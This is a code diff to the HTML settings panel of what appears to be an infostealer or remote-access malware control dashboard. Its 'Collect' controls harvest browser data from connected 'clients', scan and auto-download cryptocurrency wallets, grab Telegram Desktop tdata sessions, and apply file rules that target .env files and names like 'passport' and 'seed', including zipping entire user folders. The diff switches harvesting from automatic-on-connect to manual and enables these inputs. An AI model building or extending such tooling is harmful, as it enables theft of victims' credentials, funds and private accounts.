@@ -56,80 +56,73 @@
       <section class="card" id="settings-card" style="display:none">
         <h2>Settings</h2>
         <div id="settings-admin-msg" class="settings-notice" style="display:none">
-          Only server admins can modify auto-harvest settings.
+          Only server admins can modify harvest settings.
         </div>
         <div class="settings-grid" id="settings-grid">
-          <div class="setting-row">
+          <div class="settings-notice" style="margin-bottom:10px">
+            Harvest runs <strong>manually only</strong> (Collect / scan buttons). Nothing starts when a client connects.
+          </div>
+          <div class="setting-row" id="ah-files-row">
             <div class="setting-info">
-              <span class="setting-name">Auto-harvest on connect</span>
-              <span class="setting-desc">Automatically collect browser data when a new client connects</span>
+              <span class="setting-name">Include files on Collect</span>
+              <span class="setting-desc">When you press Collect, also scan files using the rules below</span>
             </div>
             <label class="toggle-label">
-              <input type="checkbox" id="auto-harvest-toggle" />
+              <input type="checkbox" id="auto-files-toggle" />
               <span class="toggle-track"><span class="toggle-thumb"></span></span>
             </label>
           </div>
-          <div class="setting-row setting-sub" id="ah-files-row">
+          <div class="setting-row" id="ah-ext-row">
             <div class="setting-info">
-              <span class="setting-name">Include file scan</span>
-              <span class="setting-desc">Scan for files matching the auto-upload list below</span>
+              <span class="setting-name">Include extensions on Collect</span>
+              <span class="setting-desc">Also run extension scan after Collect</span>
             </div>
             <label class="toggle-label">
-              <input type="checkbox" id="auto-files-toggle" disabled />
+              <input type="checkbox" id="auto-ext-toggle" />
               <span class="toggle-track"><span class="toggle-thumb"></span></span>
             </label>
           </div>
-          <div class="setting-row setting-sub" id="ah-ext-row">
+          <div class="setting-row" id="ah-wallets-row">
             <div class="setting-info">
-              <span class="setting-name">Include extension scan</span>
-              <span class="setting-desc">Scan for installed browser extensions</span>
+              <span class="setting-name">Include wallets on Collect</span>
+              <span class="setting-desc">Also scan and auto-download wallets after Collect</span>
             </div>
             <label class="toggle-label">
-              <input type="checkbox" id="auto-ext-toggle" disabled />
+              <input type="checkbox" id="auto-wallets-toggle" />
               <span class="toggle-track"><span class="toggle-thumb"></span></span>
             </label>
           </div>
-          <div class="setting-row setting-sub" id="ah-wallets-row">
+          <div class="setting-row" id="ah-telegram-row">
             <div class="setting-info">
-              <span class="setting-name">Include wallets</span>
-              <span class="setting-desc">Scan and auto-download browser + desktop wallets</span>
+              <span class="setting-name">Include Telegram on Collect</span>
+              <span class="setting-desc">Also scan Telegram tdata after Collect</span>
             </div>
             <label class="toggle-label">
-              <input type="checkbox" id="auto-wallets-toggle" disabled />
+              <input type="checkbox" id="auto-telegram-toggle" />
               <span class="toggle-track"><span class="toggle-thumb"></span></span>
             </label>
           </div>
-          <div class="setting-row setting-sub" id="ah-telegram-row">
-            <div class="setting-info">
-              <span class="setting-name">Include Telegram</span>
-              <span class="setting-desc">Scan Telegram Desktop tdata sessions</span>
-            </div>
-            <label class="toggle-label">
-              <input type="checkbox" id="auto-telegram-toggle" disabled />
-              <span class="toggle-track"><span class="toggle-thumb"></span></span>
-            </label>
-          </div>
-          <div class="setting-block setting-sub" id="ah-file-list-block">
+          <div class="setting-block" id="ah-file-list-block">
             <div class="setting-info" style="margin-bottom:8px">
-              <span class="setting-name">Auto-upload file list</span>
-              <span class="setting-desc">Add rules: scan a directory for matching files, or check <strong>Full upload</strong> to zip and upload the whole folder. Leave dir empty to use default user folders (Desktop, Documents, Downloads, …). Save is automatic when you click Add or toggles.</span>
+              <span class="setting-name">File scan rules</span>
+              <span class="setting-desc">Used when you Collect (if files enabled) or click Scan files. <strong>Full upload</strong> zips the whole folder. Leave dir empty for default user folders. Click <strong>Add</strong> then settings save automatically.</span>
             </div>
             <div class="file-rule-form" id="file-rule-form">
               <div class="file-rule-inputs">
                 <label class="setting-field-label">File extension
-                  <input type="text" id="rule-ext" class="input" placeholder=".env or .pdf" disabled />
+                  <input type="text" id="rule-ext" class="input" placeholder=".env or .pdf" />
                 </label>
                 <label class="setting-field-label">Name contains
-                  <input type="text" id="rule-name" class="input" placeholder="passport, seed, wallet…" disabled />
+                  <input type="text" id="rule-name" class="input" placeholder="passport, seed, wallet…" />
                 </label>
                 <label class="setting-field-label">Dir path
-                  <input type="text" id="rule-dir" class="input" placeholder="Documents or C:\Users\…\Desktop" disabled />
+                  <input type="text" id="rule-dir" class="input" placeholder="Documents or C:\Users\…\Desktop" />
                 </label>
                 <label class="file-rule-full chk-inline">
-                  <input type="checkbox" id="rule-full" disabled /> Full upload (entire folder)
+                  <input type="checkbox" id="rule-full" /> Full upload (entire folder)
                 </label>
               </div>
-              <button type="button" class="btn btn-sm" id="rule-add-btn" disabled>Add</button>
+              <button type="button" class="btn btn-sm" id="rule-add-btn">Add</button>
             </div>
             <ul class="file-rule-list" id="file-rule-list"></ul>
           </div>
